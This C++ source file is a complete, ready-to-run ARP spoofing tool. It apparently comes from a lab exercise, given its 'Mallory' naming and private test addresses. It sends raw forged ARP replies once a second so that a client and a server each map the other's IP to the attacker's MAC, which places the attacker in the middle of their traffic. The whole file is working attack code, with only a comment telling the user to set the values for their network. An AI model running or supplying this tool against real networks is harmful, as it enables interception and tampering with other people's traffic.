#include <cstring>
#include <iostream>
#include <unistd.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>

#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

using namespace std;

// set these for your network before running
const char *INTERFACE = "eth0";
const unsigned char MALLORY_MAC[6] = {0x02,0x00,0x00,0x00,0x00,0x30};
const unsigned char CLIENT_MAC[6]  = {0x02,0x00,0x00,0x00,0x00,0x20};
const unsigned char SERVER_MAC[6]  = {0x02,0x00,0x00,0x00,0x00,0x10};
const unsigned char CLIENT_IP[4] = {172,23,0,20};
const unsigned char SERVER_IP[4] = {172,23,0,10};

struct arp_header {
  uint16_t hardware_type;
  uint16_t protocol_type;
  uint8_t hardware_size;
  uint8_t protocol_size;
  uint16_t operation;

  unsigned char sender_mac[6];
  unsigned char sender_ip[4];

  unsigned char target_mac[6];
  unsigned char target_ip[4];
};

struct arp_packet {
  unsigned char destination_mac[6];
  unsigned char source_mac[6];
  uint16_t ether_type;

  arp_header arp;
};

// Send one gratuitous ARP reply telling target_mac that claimed_ip is at
// mallory_mac, poisoning the target's ARP cache.
void send_arp_reply(int socket_fd, int interface_index,
                    const unsigned char *mallory_mac,
                    const unsigned char *target_mac,
                    const unsigned char *claimed_ip,
                    const unsigned char *target_ip) {
  arp_packet packet{};

  // ethernet header
  memcpy(packet.destination_mac, target_mac, 6);
  memcpy(packet.source_mac, mallory_mac, 6);
  packet.ether_type = htons(ETH_P_ARP);

  // arp header
  packet.arp.hardware_type = htons(ARPHRD_ETHER);
  packet.arp.protocol_type = htons(ETH_P_IP);
  packet.arp.hardware_size = 6;
  packet.arp.protocol_size = 4;
  packet.arp.operation = htons(ARPOP_REPLY);

  memcpy(packet.arp.sender_mac, mallory_mac, 6);
  memcpy(packet.arp.sender_ip, claimed_ip, 4);
  memcpy(packet.arp.target_mac, target_mac, 6);
  memcpy(packet.arp.target_ip, target_ip, 4);

  sockaddr_ll destination{};
  destination.sll_family = AF_PACKET;
  destination.sll_ifindex = interface_index;
  destination.sll_halen = 6;
  memcpy(destination.sll_addr, target_mac, 6);

  sendto(socket_fd, &packet, sizeof(packet), 0, (sockaddr *)&destination,
         sizeof(destination));
}

int main() {
  int socket_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (socket_fd == -1) {
    perror("socket");
    return 1;
  }

  int interface_index = if_nametoindex(INTERFACE);
  if (interface_index == 0) {
    perror("if_nametoindex");
    close(socket_fd);
    return 1;
  }

  cout << "ARP spoofing started..." << endl;

  while (true) {
    // tell client: server IP is at Mallory's MAC
    send_arp_reply(socket_fd, interface_index, MALLORY_MAC, CLIENT_MAC,
                   SERVER_IP, CLIENT_IP);

    // tell server: client IP is at Mallory's MAC
    send_arp_reply(socket_fd, interface_index, MALLORY_MAC, SERVER_MAC,
                   CLIENT_IP, SERVER_IP);

    sleep(1);
  }

  close(socket_fd);
  return 0;
}
